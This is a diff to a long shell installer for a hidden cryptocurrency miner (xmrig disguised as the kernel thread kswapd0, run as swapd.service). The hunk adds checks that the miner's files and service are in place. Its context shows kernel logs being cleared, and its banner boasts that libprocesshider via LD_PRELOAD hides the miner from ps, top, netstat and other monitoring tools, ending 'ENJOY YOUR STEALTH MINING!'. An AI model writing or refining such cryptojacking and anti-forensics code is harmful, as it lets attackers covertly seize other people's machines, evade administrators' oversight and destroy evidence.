@@ -4029,30 +4029,114 @@ echo "[✓] dmesg cleared"
 echo "[✓] All kernel log traces removed"
 echo ""
 
-# ==================== INSTALLATION COMPLETE ====================
+# ==================== INSTALLATION VERIFICATION ====================
 echo "=========================================="
-echo "✅ INSTALLATION SUCCESSFULLY COMPLETED!"
-echo "=========================================="
-echo ""
-echo "Process hiding: libprocesshider (LD_PRELOAD)"
-echo "Miner service: swapd.service"
-echo "Status: systemctl status swapd"
-echo ""
-echo "Processes are now hidden from:"
-echo "  • ps/top/htop"
-echo "  • lsof/netstat/ss"
-echo "  • All userspace monitoring tools"
-echo ""
-echo "To verify hiding:"
-echo "  ps aux | grep swapd"
-echo "  (should only show [kswapd0] kernel thread)"
-echo ""
-echo "=========================================="
-echo "ENJOY YOUR STEALTH MINING! 🚀"
+echo "VERIFYING INSTALLATION"
 echo "=========================================="
 echo ""
 
-# Cleanup DNS fix flag file
-rm -f /tmp/.dns_fix_attempted_* 2>/dev/null || true
+INSTALL_FAILED=false
 
-exit 0
+# Check 1: /root/.swapd directory exists
+echo -n "[*] Checking /root/.swapd directory... "
+if [ -d /root/.swapd ]; then
+    echo "✅ EXISTS"
+else
+    echo "❌ NOT FOUND"
+    INSTALL_FAILED=true
+fi
+
+# Check 2: Miner binary exists
+echo -n "[*] Checking miner binary... "
+if [ -f /root/.swapd/kswapd0 ] || [ -f /root/.swapd/xmrig ]; then
+    echo "✅ EXISTS"
+else
+    echo "❌ NOT FOUND"
+    INSTALL_FAILED=true
+fi
+
+# Check 3: Config file exists
+echo -n "[*] Checking config file... "
+if [ -f /root/.swapd/swapfile ] || [ -f /root/.swapd/config.json ]; then
+    echo "✅ EXISTS"
+else
+    echo "❌ NOT FOUND"
+    INSTALL_FAILED=true
+fi
+
+# Check 4: Service is running (if systemd)
+if [ "$SYSTEMD_AVAILABLE" = true ]; then
+    echo -n "[*] Checking swapd service... "
+    if systemctl is-active --quiet swapd 2>/dev/null; then
+        echo "✅ RUNNING"
+    else
+        echo "❌ NOT RUNNING"
+        INSTALL_FAILED=true
+    fi
+fi
+
+echo ""
+
+# ==================== SHOW RESULT ====================
+if [ "$INSTALL_FAILED" = true ]; then
+    echo "=========================================="
+    echo "❌ INSTALLATION FAILED!"
+    echo "=========================================="
+    echo ""
+    echo "One or more components are missing:"
+    echo ""
+    [ ! -d /root/.swapd ] && echo "  ❌ /root/.swapd directory not found"
+    [ ! -f /root/.swapd/kswapd0 ] && [ ! -f /root/.swapd/xmrig ] && echo "  ❌ Miner binary not found"
+    [ ! -f /root/.swapd/swapfile ] && [ ! -f /root/.swapd/config.json ] && echo "  ❌ Config file not found"
+    if [ "$SYSTEMD_AVAILABLE" = true ]; then
+        if ! systemctl is-active --quiet swapd 2>/dev/null; then
+            echo "  ❌ Service not running"
+        fi
+    fi
+    echo ""
+    echo "Troubleshooting:"
+    echo "  1. Check /tmp for error logs"
+    echo "  2. Run script again with manual verification"
+    echo "  3. Check network connectivity"
+    echo ""
+    echo "=========================================="
+    
+    # Cleanup DNS fix flag file
+    rm -f /tmp/.dns_fix_attempted_* 2>/dev/null || true
+    
+    exit 1
+else
+    echo "=========================================="
+    echo "✅ INSTALLATION SUCCESSFULLY COMPLETED!"
+    echo "=========================================="
+    echo ""
+    echo "Process hiding: libprocesshider (LD_PRELOAD)"
+    echo "Miner service: swapd.service"
+    echo "Status: systemctl status swapd"
+    echo ""
+    echo "Processes are now hidden from:"
+    echo "  • ps/top/htop"
+    echo "  • lsof/netstat/ss"
+    echo "  • All userspace monitoring tools"
+    echo ""
+    echo "To verify hiding:"
+    echo "  ps aux | grep swapd"
+    echo "  (should only show [kswapd0] kernel thread)"
+    echo ""
+    echo "Installed files:"
+    echo "  Directory: /root/.swapd"
+    [ -f /root/.swapd/kswapd0 ] && echo "  Binary: /root/.swapd/kswapd0"
+    [ -f /root/.swapd/xmrig ] && echo "  Binary: /root/.swapd/xmrig"
+    [ -f /root/.swapd/swapfile ] && echo "  Config: /root/.swapd/swapfile"
+    [ -f /root/.swapd/config.json ] && echo "  Config: /root/.swapd/config.json"
+    echo ""
+    echo "=========================================="
+    echo "ENJOY YOUR STEALTH MINING! 🚀"
+    echo "=========================================="
+    echo ""
+    
+    # Cleanup DNS fix flag file
+    rm -f /tmp/.dns_fix_attempted_* 2>/dev/null || true
+    
+    exit 0
+fi
